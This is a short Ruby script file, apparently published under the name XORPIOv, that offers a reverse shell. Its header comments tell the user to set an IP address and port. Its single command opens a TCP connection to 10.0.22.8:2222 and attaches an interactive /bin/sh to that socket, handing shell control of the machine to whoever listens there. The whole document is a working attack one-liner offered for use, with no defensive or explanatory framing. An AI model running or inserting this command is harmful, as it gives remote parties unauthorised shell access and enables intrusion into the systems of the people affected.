# XORPIOv RUBY SHELL | A Reverse Shell in RUBY.
# Copyright (C) 2024 XORPIOv / https://github.com/XORPIOv
#
# Description
# ------------
# This shell / script will allow you to make an outbound connection to local IP Address and port.
# Change IP Address && PORT to local IP && PORT.

ruby -rsocket -e'f=TCPSocket.open("10.0.22.8",2222).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
